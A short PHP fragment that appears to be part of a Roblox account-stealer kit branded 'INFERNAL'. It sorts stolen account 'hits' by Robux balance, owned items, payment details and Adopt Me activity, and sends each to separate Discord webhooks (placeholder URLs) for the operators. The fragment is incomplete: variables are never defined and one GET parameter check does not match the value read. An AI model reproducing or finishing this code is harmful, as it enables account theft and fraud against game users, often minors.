<?php
//main hit 
$webhook_url = "webhokhere";
//embed
if(!isset($_GET['name'])){
    $n = "INFERNAL";
}else{
    $n = $_GET['name'];
}

if(!isset($_GET['thumb'])){
    $th = "https://i.ibb.co/TvHB0ZM/image-5.png";
}else{
    $th = $_GET['thumb'];
}

if(!isset($_GET['dh'])){
    $dc = "https://discord.gg/TeTp6GKyJc";
}else{
    $dc = $_GET['discord'];
}

//hit filter
if($robux_balance['robux'] !== 0){
    $robux_filter = "webhokhere";
    send_to_discord($robux_filter, $webhook_payload);
}


if($owned_status == "Yes"){
    $dev_filter = "webhokhere";
    send_to_discord($dev_filter, $webhook_payload);
}

if($payment_embed == "True"){
    $payment_filter = "webhokhere";
    send_to_discord($payment_filter, $webhook_payload);
}

if($adm_played == "True" || $adm_gamepasses !== 0){
    $adm_filter = "webhokhere";
    send_to_discord($adm_filter, $webhook_payload);
}

//server db
$servername = "localhost"; //stays same 
$username = "";       
$password = "";             
$dbname = ""; 